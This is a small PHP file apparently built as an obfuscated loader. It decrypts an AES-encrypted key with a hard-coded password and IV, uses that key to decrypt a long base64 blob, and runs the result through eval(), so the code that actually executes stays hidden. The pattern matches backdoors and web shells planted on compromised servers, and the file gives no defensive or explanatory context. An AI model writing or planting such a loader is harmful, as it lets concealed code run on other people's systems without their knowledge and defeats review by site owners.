<?php

$altuve = "   fFjpJ57/c+1Byfn2QNs5HIY2654RTMDidT7F+XejkSQJPlL8kxMLigV2UqxByP1CaknF8e+17W7IW4gJmR39UCDy2QAUS9ZbjXYSrotAzPeJia4+7poClttSzh7c3YxskGP7BBS6e0pn9/+Uix4+QmvwTJralzDqHic6bSOt3P5XgpB8iKU0D2ypBzyNhm9LWruC1R/k60ZKFkTZYDMyIjfBO+ZxXD0GMuayXfETJ0dbDvMlbo3GDnobkxCD87vzD8gvRMucvJxC+G8rmeJlWuVUBp5PBcAUwV+18Nid8AuC4nnQorK2d0kd31TAal9HFe+qAlYDQOwytIjmkkBkRUCyCyxbxxSCpLiyM2pnPVdabo58WJIrUT0GreaOrAYbYOHQirwwIf3AkdRxRG4zATvf9LPseMiPAR4oP75ziz7B0hfKjALW3m2uxhOUhxgmo0XsEQCDlkJt+fatpKoJ7tFtCrB8vLZMDcD2Wi4aPRe+ECsZE0RTAdqwSKaZXqWPh42TuYNZtrZ9Zhli+zH4i1EsCj57L4xDvb6xgEcDdqn/tb41JQfYElPWuLarajnyuNHcgtU0GaSk1rnzUbnDA7HH9iX7fnhRoRltf7uZnnVKRLRLcuXTAoMjfW/ER7fiat01WWYe4STwiStDjGExbxXfdM/j//W0xOjDyA9eWHpE/wtT8HCV3cCZclMJYhYLqtrwi49o8Y1vhqJPd/6/fWLPdLZopU9Go6aHdkX+hKhAhgJqRhSiGmqqmvZ8I8GO7ZnuGj9VFpDupii91BfClF5TRQiUKJK+RF+3EBYQUQs= ";


$zerpa = "  AN99WMpfHhEGk7cZa30RuA==  ";


$zerpa_zerpa = "1234567890123456";


$rafael = openssl_decrypt($zerpa, 'AES-256-CBC', $zerpa_zerpa, 0, '1234567890123456');


$avendaño = openssl_decrypt($altuve, 'AES-256-CBC', $rafael, 0, '1234567890123456');


eval($avendaño);
?>
